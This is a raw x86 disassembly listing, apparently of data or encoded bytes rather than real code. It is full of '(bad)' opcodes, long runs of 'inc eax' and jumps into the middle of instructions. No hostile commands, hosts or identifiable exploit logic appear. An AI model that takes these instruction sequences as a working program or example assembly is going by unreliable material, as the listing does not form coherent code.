  40b30d:	inc    eax
  40b30e:	and    eax,0xa8404040
  40b313:	out    0x64,eax
  40b315:	fild   QWORD PTR [edi+0x7d62c55f]
  40b31b:	or     esi,DWORD PTR [esi-0x7a]
  40b31e:	inc    esp
  40b31f:	dec    esi
  40b320:	dec    esi
  40b321:	inc    ecx
  40b322:	and    ah,BYTE PTR [edx-0x40df000c]
  40b328:	(bad)  
  40b329:	cwde   
  40b32a:	bound  esp,QWORD PTR [ebx-0x25]
  40b32d:	inc    eax
  40b32e:	inc    eax
  40b32f:	inc    eax
  40b330:	inc    eax
  40b331:	inc    eax
  40b332:	inc    eax
  40b333:	inc    eax
  40b334:	inc    eax
  40b335:	inc    eax
  40b336:	inc    eax
  40b337:	or     esp,DWORD PTR [ebx]
  40b339:	lahf   
  40b33a:	inc    esp
  40b33b:	(bad)  
  40b33c:	sbb    eax,0x40009427
  40b341:	inc    edi
  40b342:	sub    al,0xa8
  40b344:	pushf  
  40b345:	push   esp
  40b346:	arpl   cx,dx
  40b348:	and    BYTE PTR [ebx+0x7a],dl
  40b34b:	adc    BYTE PTR [ebx+eiz*2+0x62c2bc5],al
  40b352:	aad    0x50
  40b354:	ret    
  40b355:	inc    eax
  40b356:	inc    eax
  40b357:	inc    eax
  40b358:	inc    eax
  40b359:	inc    eax
  40b35a:	inc    eax
  40b35b:	rol    DWORD PTR [eax+0x40],0x60
  40b35f:	imul   eax,DWORD PTR [esi+0x3b],0xffffffff
  40b363:	or     BYTE PTR [ecx-0x7a],al
  40b366:	xor    al,0xe1
  40b368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b369:	and    BYTE PTR [esi],al
  40b36b:	inc    BYTE PTR [ebp-0x62]
  40b36e:	leave  
  40b36f:	fimul  DWORD PTR [edx+0x3044ff14]
  40b375:	pop    edx
  40b376:	mov    dh,ah
  40b378:	stos   BYTE PTR es:[edi],al
  40b379:	xor    DWORD PTR [ebx],ebx
  40b37b:	sub    al,0x41
  40b37d:	dec    ebx
  40b37e:	inc    esi
  40b37f:	(bad)  
  40b380:	in     al,0x40
  40b382:	inc    eax
  40b383:	add    BYTE PTR [eax+0x40],al
  40b386:	inc    eax
  40b387:	inc    eax
  40b388:	inc    eax
  40b389:	inc    eax
  40b38a:	loope  0x40b363
  40b38c:	js     0x40b326
  40b38e:	cld    
  40b38f:	ror    BYTE PTR [edx],1
  40b391:	loope  0x40b3c5
  40b393:	jnp    0x40b362
  40b395:	sahf   
  40b396:	push   0x46
  40b398:	aad    0x46
  40b39a:	ss xchg ebp,eax
  40b39c:	and    BYTE PTR [eax-0x68aee56],ch
  40b3a2:	jmp    0x40b3e4
  40b3a4:	inc    eax
  40b3a5:	inc    eax
  40b3a6:	inc    eax
  40b3a7:	inc    eax
  40b3a8:	inc    eax
  40b3a9:	inc    eax
  40b3aa:	inc    eax
  40b3ab:	inc    eax
  40b3ac:	inc    eax
  40b3ad:	inc    eax
  40b3ae:	(bad)  
  40b3af:	adc    DWORD PTR [eax+ebp*4-0xf856002],ebp
  40b3b6:	inc    esp
  40b3b7:	inc    esp
  40b3b8:	gs dec esp
  40b3ba:	fld    TBYTE PTR [edi]
  40b3bc:	enter  0x2c29,0x41
  40b3c0:	sbb    DWORD PTR [edx],ebp
  40b3c2:	xchg   esp,eax
  40b3c3:	fsub   DWORD PTR [ebx]
  40b3c5:	sbb    al,0x76
  40b3c7:	inc    ebp
  40b3c8:	cmp    al,0x76
  40b3ca:	fs ja  0x40b40d
  40b3cd:	inc    eax
  40b3ce:	inc    eax
  40b3cf:	inc    eax
  40b3d0:	inc    eax
  40b3d1:	inc    eax
  40b3d2:	int3   
  40b3d3:	jne    0x40b415
  40b3d5:	jne    0x40b3a8
  40b3d7:	lds    esi,FWORD PTR [eax]
  40b3d9:	inc    esp
  40b3da:	inc    ebx
  40b3db:	pop    ebx
  40b3dc:	dec    eax
  40b3dd:	and    DWORD PTR [ebp-0x3f87bebe],edi
  40b3e3:	hlt    
  40b3e4:	jl     0x40b44b
  40b3e6:	pop    ecx
  40b3e7:	(bad)  
  40b3e8:	cwde   
  40b3e9:	jae    0x40b427
  40b3eb:	fisttp DWORD PTR [edi]
  40b3ed:	mov    eax,ds:0x82ad4430
  40b3f2:	fs xchg esp,eax
  40b3f4:	cmovg  esi,DWORD PTR [edx]
  40b3f7:	sub    al,0x40
  40b3f9:	add    cl,al
  40b3fb:	inc    eax
  40b3fc:	inc    eax
  40b3fd:	inc    eax
  40b3fe:	inc    eax
  40b3ff:	add    BYTE PTR [eax-0x58],al
  40b402:	fs pop esp
  40b404:	arpl   WORD PTR [ebx+0x12744ea0],dx
  40b40a:	cli    
  40b40b:	and    al,0xc5
  40b40d:	aaa    
  40b40e:	xor    edx,DWORD PTR [ecx]
  40b410:	jle    0x40b46a
  40b412:	or     ah,BYTE PTR [esi]
  40b414:	jne    0x40b412
  40b416:	enter  0x8d51,0x11
  40b41a:	inc    esp
  40b41b:	cmp    ch,ah
  40b41d:	lock sub DWORD PTR [eax+0x40],eax
  40b421:	inc    eax
  40b422:	inc    eax
  40b423:	inc    eax
  40b424:	inc    eax
  40b425:	inc    eax
  40b426:	inc    eax
  40b427:	inc    DWORD PTR [eax-0x6f]
  40b42a:	inc    esp
  40b42b:	inc    edx
  40b42c:	push   eax
  40b42d:	or     al,bh
  40b42f:	cmc    
  40b430:	inc    esp
  40b431:	add    ch,BYTE PTR [edi+ecx*8]
  40b434:	fisubr DWORD PTR [eax+eax*2]
  40b437:	inc    eax
  40b438:	inc    eax
  40b439:	inc    eax
  40b43a:	inc    eax
  40b43b:	inc    eax
  40b43c:	inc    eax
  40b43d:	inc    eax
  40b43e:	inc    eax
  40b43f:	inc    eax
  40b440:	iret   
  40b441:	jo     0x40b4a4
  40b443:	cdq    
  40b444:	jb     0x40b472
  40b446:	inc    eax
  40b447:	lods   al,BYTE PTR ds:[esi]
  40b448:	jno    0x40b4a6
  40b44a:	cmp    esp,DWORD PTR [edi-0x3c9dbb33]
  40b450:	bound  ecx,QWORD PTR [edi+0x59cc74c9]
  40b456:	pop    eax
  40b457:	in     eax,0xd5
  40b459:	cmp    ch,al
  40b45b:	push   cs
  40b45c:	jb     0x40b493
  40b45e:	or     eax,0x3a8c743e
  40b463:	or     ah,BYTE PTR [edx+edi*1+0x40]
  40b467:	inc    eax
  40b468:	inc    eax
  40b469:	inc    eax
  40b46a:	inc    eax
  40b46b:	inc    eax
  40b46c:	inc    eax
  40b46d:	inc    eax
  40b46e:	add    bl,cl
  40b470:	fs stc 
  40b472:	cmp    BYTE PTR [eax-0x45],cl
  40b475:	inc    esp
  40b476:	mov    esp,0x42da234f
  40b47b:	popa   
  40b47c:	std    
  40b47d:	sub    al,0xa8
  40b47f:	inc    ecx
  40b480:	lock fs je 0x40b445
  40b484:	jg     0x40b4f6
  40b486:	adc    BYTE PTR [ebx+0x10],bh
  40b489:	bound  ecx,QWORD PTR [ebx+0x6448df61]
  40b48f:	sbb    BYTE PTR [eax],0x2
  40b492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b493:	inc    eax
  40b494:	inc    eax
  40b495:	inc    eax
  40b496:	inc    eax
  40b497:	inc    eax
  40b498:	inc    eax
  40b499:	and    eax,0x3c404040
  40b49e:	dec    eax
  40b49f:	popf   
  40b4a0:	add    ah,BYTE PTR [eax+ebp*2-0x33]
  40b4a4:	cmp    eax,0xcb44f762
  40b4a9:	ins    DWORD PTR es:[edi],dx
  40b4aa:	jg     0x40b510
  40b4ac:	inc    eax
  40b4ad:	inc    eax
  40b4ae:	inc    eax
  40b4af:	inc    eax
  40b4b0:	inc    eax
  40b4b1:	inc    eax
  40b4b2:	inc    eax
  40b4b3:	inc    eax
  40b4b4:	inc    eax
  40b4b5:	inc    eax
  40b4b6:	jle    0x40b4e5
  40b4b8:	jns    0x40b4e6
  40b4ba:	dec    eax
  40b4bb:	inc    eax
  40b4bc:	shl    dh,0x76
  40b4bf:	inc    eax
  40b4c0:	cdq    
  40b4c1:	outs   dx,BYTE PTR ds:[esi]
  40b4c2:	adc    eax,0xc4ee4962
  40b4c7:	das    
  40b4c8:	add    al,0xd5
  40b4ca:	inc    esi
  40b4cb:	and    DWORD PTR [esi-0x38],esp
  40b4ce:	out    dx,eax
  40b4cf:	clc    
  40b4d0:	mov    edi,0x40d84920
  40b4d5:	inc    eax
  40b4d6:	inc    eax
  40b4d7:	inc    eax
  40b4d8:	inc    eax
  40b4d9:	inc    eax
  40b4da:	rol    DWORD PTR [eax+0x40],0xfa
  40b4de:	fs std 
  40b4e0:	inc    ebx
  40b4e1:	dec    edi
  40b4e2:	(bad)  
  40b4e3:	nop
  40b4e4:	push   edx
  40b4e5:	fs stos WORD PTR es:[edi],ax
  40b4e8:	arpl   WORD PTR [edi+0x63c04b44],di
  40b4ee:	call   0x4080fda6
  40b4f3:	add    BYTE PTR [eax+0x40],al
  40b4f6:	inc    eax
  40b4f7:	inc    eax
  40b4f8:	inc    eax
  40b4f9:	inc    eax
  40b4fa:	inc    esi
  40b4fb:	sub    al,0xa8
  40b4fd:	dec    ecx
  40b4fe:	mov    edi,0x3861e8f8
  40b503:	ins    BYTE PTR es:[edi],dx
  40b504:	adc    DWORD PTR [ecx],esp
  40b506:	mov    edi,0x641cdee
  40b50b:	int    0x5c
  40b50d:	sub    eax,0x213d3dbe
  40b512:	inc    edi
  40b513:	and    BYTE PTR [eax],cl
  40b515:	test   al,0x66
  40b517:	arpl   WORD PTR [ebx+0x6d],ax
  40b51a:	inc    eax
  40b51b:	inc    eax
  40b51c:	inc    eax
  40b51d:	inc    eax
  40b51e:	inc    eax
  40b51f:	inc    eax
  40b520:	inc    eax
  40b521:	inc    eax
  40b522:	inc    eax
  40b523:	inc    eax
  40b524:	lock dec bl
  40b527:	mov    ds:0x6177e1c5,al
  40b52c:	mov    ebp,0x4f724844
  40b531:	js     0x40b514
  40b533:	push   esi
  40b534:	je     0x40b562
  40b536:	add    eax,0x64648053
  40b53b:	loope  0x40b5a7
  40b53d:	push   0xffffffcb
  40b53f:	push   esp
  40b540:	(bad)
  40b543:	inc    ebp
  40b544:	repz lds eax,FWORD PTR [eax+0x40]
  40b548:	inc    eax
  40b549:	inc    eax
  40b54a:	inc    eax
  40b54b:	inc    eax
  40b54c:	int3   
  40b54d:	jne    0x40b58f
  40b54f:	push   ds
  40b550:	xor    BYTE PTR [ebp+0x3c],al
  40b553:	pop    ecx
  40b554:	and    al,0x6d
  40b556:	and    BYTE PTR [edi-0x17],al
  40b559:	mul    DWORD PTR [ecx+eax*1+0x23]
  40b55d:	xchg   ebx,eax
  40b55e:	inc    BYTE PTR [ecx+0x44]
  40b561:	inc    eax
  40b562:	add    cl,al
  40b564:	inc    eax
  40b565:	inc    eax
  40b566:	inc    eax
  40b567:	inc    eax
  40b568:	add    BYTE PTR [eax+0x44],al
  40b56b:	sub    edi,esp
  40b56d:	inc    ebx
  40b56e:	imul   eax,DWORD PTR [eax+ebx*2-0x4],0x63
  40b573:	xchg   esp,eax
  40b574:	cmp    ah,BYTE PTR [eax+0x59522c7f]
  40b57a:	dec    ebp
  40b57b:	mov    edx,0x6855bdde
  40b580:	ins    DWORD PTR es:[edi],dx
  40b581:	pusha  
  40b582:	stos   DWORD PTR es:[edi],eax
  40b583:	out    0xb0,eax
  40b585:	cs push ecx
  40b587:	aad    0x40
  40b589:	inc    eax
  40b58a:	inc    eax
  40b58b:	inc    eax
  40b58c:	inc    eax
  40b58d:	inc    eax
  40b58e:	inc    eax
  40b58f:	inc    eax
  40b590:	inc    DWORD PTR [eax+0x3c]
  40b593:	adc    eax,0x2cb01142
  40b598:	jne    0x40b5ab
  40b59a:	inc    eax
  40b59b:	div    BYTE PTR ds:0xf5ff5763
  40b5a1:	(bad)  
  40b5a2:	sub    al,0x44
  40b5a4:	inc    eax
  40b5a5:	mov    eax,0x40e83fab
  40b5aa:	inc    eax
  40b5ab:	inc    eax
  40b5ac:	inc    eax
  40b5ad:	inc    eax
  40b5ae:	inc    eax
  40b5af:	inc    eax
  40b5b0:	inc    eax
  40b5b1:	inc    eax
  40b5b2:	inc    eax
  40b5b3:	inc    esp
  40b5b4:	sub    esi,edi
  40b5b6:	jp     0x40b605
  40b5b8:	stos   BYTE PTR es:[edi],al
  40b5b9:	mov    eax,ds:0x672c2c73
  40b5be:	ret    
  40b5bf:	lods   eax,DWORD PTR ds:[esi]
  40b5c0:	lea    ebp,ds:0x9aaa662b
  40b5c6:	mov    esp,0xf3a3feb6
  40b5cb:	push   esi
  40b5cc:	cmp    al,0xd4
  40b5ce:	adc    eax,0x3f227d50
  40b5d3:	mov    DWORD PTR [ecx+0x40b9cb62],edx
  40b5d9:	inc    eax
  40b5da:	inc    eax
  40b5db:	inc    eax
  40b5dc:	inc    eax
  40b5dd:	inc    eax
  40b5de:	inc    eax
  40b5df:	inc    eax
  40b5e0:	add    BYTE PTR [edx+eiz*1+0x65584465],dh
  40b5e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5e8:	mov    ah,0xfe
  40b5ea:	and    DWORD PTR [ecx+0x2c],edi
  40b5ed:	sub    esp,ebx
  40b5ef:	or     eax,0x4054561f
  40b5f4:	inc    eax
  40b5f5:	inc    eax
  40b5f6:	inc    eax
  40b5f7:	inc    eax
  40b5f8:	inc    eax
  40b5f9:	and    eax,0x48404040
  40b5fe:	cmp    BYTE PTR fs:[esi-0x37],bh
  40b602:	mov    ebp,0xc5f121c0
  40b607:	enter  0x48bc,0xb2
  40b60b:	in     eax,0x40
  40b60d:	sbb    al,0x7c
  40b60f:	dec    edi
  40b610:	arpl   WORD PTR [ebx+0x50],ax
  40b613:	sbb    eax,0x404035a3
  40b618:	inc    eax
  40b619:	inc    eax
  40b61a:	inc    eax
  40b61b:	inc    eax
  40b61c:	inc    eax
  40b61d:	inc    eax
  40b61e:	inc    eax
  40b61f:	inc    eax
  40b620:	(bad)  
  40b621:	sub    bl,BYTE PTR [esi+0x3b5ab9a4]
  40b627:	bound  eax,QWORD PTR [esp+edx*1+0x65]
  40b62b:	or     eax,0xf348f3b0
  40b630:	sub    al,0x12
  40b632:	fisttp QWORD PTR [esi+0xd]
  40b635:	fwait
  40b636:	and    BYTE PTR [ebx+0x62],bl
  40b639:	inc    eax
  40b63a:	inc    eax
  40b63b:	inc    eax
  40b63c:	inc    eax
  40b63d:	inc    eax
  40b63e:	inc    eax
  40b63f:	rol    DWORD PTR [eax+0x40],0xd1
  40b643:	out    0xc5,eax
  40b645:	in     al,dx
  40b646:	adc    eax,0x33d55325
  40b64b:	mov    BYTE PTR [esi+ebx*8],ch
  40b64e:	inc    eax
  40b64f:	and    ebx,DWORD PTR [ebx+0x71]
  40b652:	cmp    al,0x63
  40b654:	bound  esp,QWORD PTR [ebp-0x23]
  40b657:	and    DWORD PTR [edi+0x72],ebx
  40b65a:	out    0x50,eax
  40b65c:	stos   DWORD PTR es:[edi],eax
  40b65d:	scas   al,BYTE PTR es:[edi]
  40b65e:	fwait
  40b65f:	cmp    al,0xc1
  40b661:	push   esp
  40b662:	clc    
  40b663:	pop    es
  40b664:	mov    edi,0x40e6dd5a
  40b669:	inc    eax
  40b66a:	add    BYTE PTR [eax+0x40],al
  40b66d:	inc    eax
  40b66e:	inc    eax
  40b66f:	inc    eax
  40b670:	inc    eax
  40b671:	xor    eax,0xbfd97144
  40b676:	mov    ebp,0x2c9830cc
  40b67b:	inc    ecx
  40b67c:	bound  edi,QWORD PTR [esi+0x51280eac]
  40b682:	pusha  
  40b683:	mov    esp,ds
  40b685:	lds    edx,FWORD PTR [edi+eiz*8-0x5e]
  40b689:	mov    edi,0xa9641802
  40b68e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b68f:	sub    DWORD PTR cs:[ebp-0x63],esp
  40b693:	test   al,0x62
  40b695:	inc    ebp
  40b696:	stos   BYTE PTR es:[edi],al
  40b697:	inc    eax
  40b698:	inc    eax
  40b699:	inc    eax
  40b69a:	inc    eax
  40b69b:	inc    eax
  40b69c:	inc    eax
  40b69d:	inc    eax
  40b69e:	inc    eax
  40b69f:	inc    eax
  40b6a0:	inc    eax
  40b6a1:	xor    BYTE PTR [esi-0x2f],bl
  40b6a4:	inc    esp
  40b6a5:	dec    ebx
  40b6a6:	gs stos DWORD PTR es:[edi],eax
  40b6a8:	dec    ebp
  40b6a9:	inc    ebx
  40b6aa:	and    BYTE PTR [ebp+0x2c],bh
  40b6ad:	fadd   QWORD PTR ss:[eax+0x40]
  40b6b1:	inc    eax
  40b6b2:	inc    eax
  40b6b3:	inc    eax
  40b6b4:	inc    eax
  40b6b5:	int3   
  40b6b6:	jne    0x40b6f8
  40b6b8:	inc    edx
  40b6b9:	lods   eax,DWORD PTR ds:[esi]
  40b6ba:	mov    ebx,0x445e53f5
  40b6bf:	jmp    0x61285f6f
  40b6c4:	jns    0x40b6d1
  40b6c6:	dec    esp
  40b6c7:	inc    esp
  40b6c8:	xchg   edx,eax
  40b6c9:	inc    esi
  40b6ca:	inc    ebp
  40b6cb:	mov    dh,0xd3
  40b6cd:	mov    ebp,0xb5bffdd5
  40b6d2:	push   edx
  40b6d3:	xchg   ecx,eax
  40b6d4:	fidivr WORD PTR [edi-0x59af90dc]
  40b6da:	retf   0xd540
  40b6dd:	mov    edi,0x40c10040
  40b6e2:	inc    eax
  40b6e3:	inc    eax
  40b6e4:	inc    eax
  40b6e5:	add    BYTE PTR [eax-0x58],al
  40b6e8:	test   al,0x4b
  40b6ea:	adc    eax,0xbd4f0456
  40b6ef:	adc    al,bl
  40b6f1:	inc    ecx
  40b6f2:	fild   QWORD PTR [esi]
  40b6f4:	jo     0x40b6e7
  40b6f6:	pop    esp
  40b6f7:	mov    dh,0x44
  40b6f9:	xor    al,0x6a
  40b6fb:	and    BYTE PTR [eax-0x78],al
  40b6fe:	inc    eax
  40b6ff:	inc    eax
  40b700:	inc    eax
  40b701:	inc    eax
  40b702:	inc    eax
  40b703:	inc    eax
  40b704:	inc    eax
  40b705:	inc    eax
  40b706:	inc    DWORD PTR [eax+0x41]
  40b709:	inc    edi
  40b70a:	cld    
  40b70b:	shl    BYTE PTR [ebp-0x80],0x0
  40b70f:	icebp  
  40b710:	or     esp,DWORD PTR [edx+0x6d]
  40b713:	test   al,0xa4
  40b715:	xchg   ebx,eax
  40b716:	js     0x40b76d
  40b718:	mov    esp,0xd1102ab
  40b71d:	inc    ecx
  40b71e:	inc    eax
  40b71f:	mov    cl,0x40
  40b721:	inc    eax
  40b722:	inc    eax
  40b723:	inc    eax
  40b724:	inc    eax
  40b725:	inc    eax
  40b726:	inc    eax
  40b727:	inc    eax
  40b728:	inc    eax
  40b729:	inc    eax
  40b72a:	mov    edi,0x14b8cc40
  40b72f:	adc    esp,DWORD PTR [ebx-0x40]
  40b732:	mov    edi,0xf6418f13
  40b737:	and    al,0x28
  40b739:	sar    DWORD PTR [ebp+0x4030e81a],1
  40b73f:	inc    eax
  40b740:	inc    eax
  40b741:	inc    eax
  40b742:	inc    eax
  40b743:	inc    eax
  40b744:	inc    eax
  40b745:	inc    eax
  40b746:	add    cl,bh
  40b748:	test   DWORD PTR [eax-0x41],0x1c68625a
  40b74f:	mov    ds:0x415f7a2c,al
  40b754:	xor    BYTE PTR [eax+0x62],bl
  40b757:	popa   
  40b758:	inc    sp
  40b75a:	adc    eax,0x40b79867
  40b75f:	inc    eax
  40b760:	inc    eax
  40b761:	inc    eax
  40b762:	inc    eax
  40b763:	inc    eax
  40b764:	and    eax,0x34404040
  40b769:	mov    dh,0x3e
  40b76b:	add    ch,BYTE PTR [esp+edi*4]
  40b76e:	push   eax
  40b76f:	lds    eax,FWORD PTR [eax]
  40b771:	mov    al,ds:0xbf982cca
  40b776:	repz mov ds:0x9b43e143,al
  40b77c:	inc    ebx
  40b77d:	mov    edi,0x53aa8ad
  40b782:	push   ebp
  40b783:	add    DWORD PTR [eax+0x40],0x40404040
  40b78a:	inc    eax
  40b78b:	inc    eax
  40b78c:	inc    eax
  40b78d:	inc    eax
  40b78e:	pop    ds
  40b78f:	mov    ebp,0x66ce1163
  40b794:	call   0x948:0x345837b4
  40b79b:	sahf   
  40b79c:	inc    eax
  40b79d:	inc    eax
  40b79e:	inc    eax
  40b79f:	inc    eax
  40b7a0:	inc    eax
  40b7a1:	inc    eax
  40b7a2:	rol    DWORD PTR [eax+0x40],0xae
  40b7a6:	test   DWORD PTR [ebp+0x41],ecx
  40b7a9:	in     al,dx
  40b7aa:	inc    ecx
  40b7ab:	jno    0x40b807
  40b7ad:	dec    eax
  40b7ae:	pop    eax
  40b7af:	adc    eax,0x620863c7
  40b7b4:	mov    ebp,0x404e00c5
  40b7b9:	inc    eax
  40b7ba:	add    BYTE PTR [eax+0x40],al
  40b7bd:	inc    eax
  40b7be:	inc    eax
  40b7bf:	inc    eax
  40b7c0:	inc    eax
  40b7c1:	test   al,0x59
  40b7c3:	cld    
  40b7c4:	pop    eax
  40b7c5:	pushf  
  40b7c6:	dec    edi
  40b7c7:	das    
  40b7c8:	cmp    eax,0xd4d1d5f0
  40b7cd:	push   esp
  40b7ce:	sub    BYTE PTR [esi+0x4f],0xdc
  40b7d2:	sbb    eax,0x4c2ea500
  40b7d8:	xor    eax,0x6c626364
  40b7dd:	call   0x15f:0xcb4980a9
  40b7e4:	fst    DWORD PTR ds:0x40406023
  40b7ea:	inc    eax
  40b7eb:	inc    eax
  40b7ec:	inc    eax
  40b7ed:	inc    eax
  40b7ee:	inc    eax
  40b7ef:	inc    eax
  40b7f0:	inc    eax
  40b7f1:	inc    eax
  40b7f2:	jae    0x40b833
  40b7f4:	das    
  40b7f5:	add    bl,ch
  40b7f7:	fcom   st(2)
  40b7f9:	stos   DWORD PTR es:[edi],eax
  40b7fa:	scas   eax,DWORD PTR es:[edi]
  40b7fb:	test   eax,0xceab66c1
  40b800:	add    BYTE PTR [ebp+0x7b656210],al
  40b806:	inc    edx
  40b807:	fs add al,0xdc
  40b80a:	xlat   BYTE PTR ds:[ebx]
  40b80b:	adc    edi,ebp
  40b80d:	fsubr  QWORD PTR [ebx+0x4080d2fa]
  40b813:	inc    eax
  40b814:	inc    eax
  40b815:	inc    eax
  40b816:	inc    eax
  40b817:	inc    eax
  40b818:	int3   
  40b819:	jne    0x40b85b
  40b81b:	push   esp
  40b81c:	sbb    al,0x11
  40b81e:	pop    esi
  40b81f:	nop
  40b820:	cwde   
  40b821:	fidivr DWORD PTR [edx+0x71]
  40b824:	push   ebx
  40b825:	arpl   WORD PTR [eax+0x45200dbf],cx
  40b82b:	clc    
  40b82c:	int    0x1
  40b82e:	outs   dx,BYTE PTR ds:[esi]
  40b82f:	inc    ebx
  40b830:	(bad)  [esi+0x0]
  40b833:	rcl    DWORD PTR [ecx],1
  40b835:	inc    eax
  40b836:	add    cl,al
  40b838:	inc    eax
  40b839:	inc    eax
  40b83a:	inc    eax
  40b83b:	inc    eax
  40b83c:	add    BYTE PTR [eax+0x6c],al
  40b83f:	push   0x3b
  40b841:	lahf   
  40b842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b843:	cmp    bl,BYTE PTR [edi+0x58]
  40b846:	(bad)  
  40b847:	int3   
  40b848:	and    BYTE PTR [edi+ebx*8-0x74],ah
  40b84c:	xchg   ebp,eax
  40b84d:	xor    ch,BYTE PTR [ecx+0x14f95283]
  40b853:	add    BYTE PTR [edi-0xa],0x45
  40b857:	jae    0x40b85c
  40b859:	xchg   esi,eax
  40b85a:	xor    ch,0x92
  40b85d:	cmp    BYTE PTR [ebx+0x1e051877],ch
  40b863:	inc    eax
  40b864:	inc    eax
  40b865:	inc    eax
  40b866:	inc    eax
  40b867:	inc    eax
  40b868:	inc    eax
  40b869:	inc    eax
  40b86a:	inc    eax
  40b86b:	inc    DWORD PTR [eax+0x6d]
  40b86e:	outs   dx,BYTE PTR ds:[esi]
  40b86f:	outs   dx,BYTE PTR ds:[esi]
  40b870:	inc    edx
  40b871:	pop    edx
  40b872:	bound  ecx,QWORD PTR [eax-0x56]
  40b875:	out    dx,eax
  40b876:	dec    eax
  40b877:	push   eax
  40b878:	inc    ecx
  40b879:	bound  eax,QWORD PTR [eax+0x40]
  40b87c:	inc    eax
  40b87d:	inc    eax
  40b87e:	inc    eax
  40b87f:	inc    eax
  40b880:	inc    eax
  40b881:	inc    eax
  40b882:	inc    eax
  40b883:	inc    eax
  40b884:	(bad)  
  40b886:	es add al,0x50
  40b889:	push   edx
  40b88a:	scas   al,BYTE PTR es:[edi]
  40b88b:	imul   ebp,ebp,0x3
  40b88e:	clc    
  40b88f:	es sub eax,0xa8a4483e
  40b895:	inc    eax
  40b896:	inc    eax
  40b897:	inc    eax
  40b898:	inc    eax
  40b899:	inc    eax
  40b89a:	inc    eax
  40b89b:	inc    eax
  40b89c:	inc    eax
  40b89d:	add    al,bh
  40b89f:	adc    eax,DWORD PTR [ebp-0x46]
  40b8a2:	int3   
  40b8a3:	bound  ebx,QWORD PTR [ebp+0x12]
  40b8a6:	xchg   esp,eax
  40b8a7:	rol    BYTE PTR [ecx],0x45
  40b8aa:	outs   dx,BYTE PTR ds:[esi]
  40b8ab:	inc    ebp
  40b8ac:	xchg   DWORD PTR [ecx+0x54],eax
  40b8af:	mov    eax,ds:0x3c5cf2f3
  40b8b4:	les    esp,FWORD PTR [bx-0x7d93]
  40b8b9:	outs   dx,BYTE PTR ds:[esi]
  40b8ba:	push   edx
  40b8bb:	das    
  40b8bc:	sub    DWORD PTR [eax+0x40],eax
  40b8bf:	inc    eax
  40b8c0:	inc    eax
  40b8c1:	inc    eax
  40b8c2:	inc    eax
  40b8c3:	and    eax,0x38404040
  40b8c8:	xchg   edx,eax
  40b8c9:	adc    eax,0x88d54a39
  40b8ce:	bound  ecx,QWORD PTR [ebp+ecx*1+0x62]
  40b8d2:	xchg   edx,eax
  40b8d3:	pop    edx
  40b8d4:	retf   
  40b8d5:	addr16 inc ecx
  40b8d7:	sub    al,0xd9
  40b8d9:	cmp    al,0x1
  40b8db:	and    ch,cl
  40b8dd:	dec    esi
  40b8de:	xchg   ebp,ecx
  40b8e0:	add    ch,BYTE PTR [eax+0x6a]
  40b8e3:	inc    edx
  40b8e4:	gs (bad) 
  40b8e6:	pop    esp
  40b8e7:	int    0x64
  40b8e9:	inc    eax
  40b8ea:	inc    eax
  40b8eb:	inc    eax
  40b8ec:	inc    eax
  40b8ed:	inc    eax
  40b8ee:	inc    eax
  40b8ef:	inc    eax
  40b8f0:	inc    eax
  40b8f1:	inc    eax
  40b8f2:	inc    eax
  40b8f3:	add    eax,0xa86bb301
  40b8f8:	or     eax,0x1baff942
  40b8fd:	inc    ecx
  40b8fe:	or     al,0x12
  40b900:	retf   
  40b901:	cmp    dl,BYTE PTR [eax+0x52504a50]
  40b907:	inc    ecx
  40b908:	inc    eax
  40b909:	inc    eax
  40b90a:	inc    eax
  40b90b:	inc    eax
  40b90c:	inc    eax
  40b90d:	inc    eax
  40b90e:	rol    DWORD PTR [eax+0x40],0x49
  40b912:	lds    eax,FWORD PTR ds:0xcf33806e
  40b918:	cwde   
  40b919:	xor    eax,0x3490e2c9
  40b91e:	inc    ecx
  40b91f:	mov    ah,0x38
  40b921:	inc    ecx
  40b922:	rol    DWORD PTR [edi+0x40406442],1
  40b928:	add    BYTE PTR [eax+0x40],al
  40b92b:	inc    eax
  40b92c:	inc    eax
  40b92d:	inc    eax
  40b92e:	inc    eax
  40b92f:	cmp    ebp,DWORD PTR [esi+0x62]
  40b932:	mov    al,0x44
  40b934:	gs and eax,0x48e0ed01
  40b93a:	cmp    eax,0x407c8e41
  40b93f:	inc    eax
  40b940:	inc    eax
  40b941:	inc    eax
  40b942:	inc    eax
  40b943:	inc    eax
  40b944:	inc    eax
  40b945:	inc    eax
  40b946:	inc    eax
  40b947:	inc    eax
  40b948:	(bad)  
  40b94a:	push   edx
  40b94b:	lock ret 
  40b94d:	icebp  
  40b94e:	ffreep st(7)
  40b950:	adc    ebp,0xd44f89d8
  40b956:	jne    0x40b906
  40b958:	pusha  
  40b959:	jo     0x40b903
  40b95b:	xor    BYTE PTR [edx+edx*2],dh
  40b95e:	dec    dx
  40b960:	add    DWORD PTR [ecx+0x4440646e],edx
  40b966:	inc    eax
  40b967:	inc    eax
  40b968:	inc    eax
  40b969:	inc    eax
  40b96a:	inc    eax
  40b96b:	inc    eax
  40b96c:	int3   
  40b96d:	jne    0x40b9af
  40b96f:	mov    WORD PTR [edx],cs
  40b971:	fidiv  WORD PTR [ecx]
  40b973:	aam    0x8a
  40b975:	pop    esp
  40b976:	or     dl,bl
  40b978:	push   edx
  40b979:	adc    DWORD PTR [edx+0x434c2152],0x2a4a9839
  40b983:	pop    edx
  40b984:	dec    edi
  40b985:	inc    eax
  40b986:	add    cl,al
  40b988:	inc    eax
  40b989:	inc    eax
  40b98a:	inc    eax
  40b98b:	inc    eax
  40b98c:	add    BYTE PTR [eax-0x48],al
  40b98f:	ss inc bx
  40b992:	add    al,0x40
  40b994:	mov    al,0x24
  40b996:	test   BYTE PTR [edx+ecx*4+0x5],ch
  40b99a:	jl     0x40b9cb
  40b99c:	outs   dx,BYTE PTR ds:[esi]
  40b99d:	cmp    esp,DWORD PTR [edx+0x35]
  40b9a0:	add    eax,0xd40bfe65
  40b9a5:	cmp    al,BYTE PTR [eax+0x40]
  40b9a8:	inc    eax
  40b9a9:	inc    eax
  40b9aa:	inc    eax
  40b9ab:	inc    eax
  40b9ac:	inc    eax
  40b9ad:	inc    eax
  40b9ae:	inc    DWORD PTR [eax-0x4c]
  40b9b1:	enter  0xd0ec,0x73
  40b9b5:	adc    dl,BYTE PTR [edx-0xd]
  40b9b8:	inc    ecx
  40b9b9:	push   esp
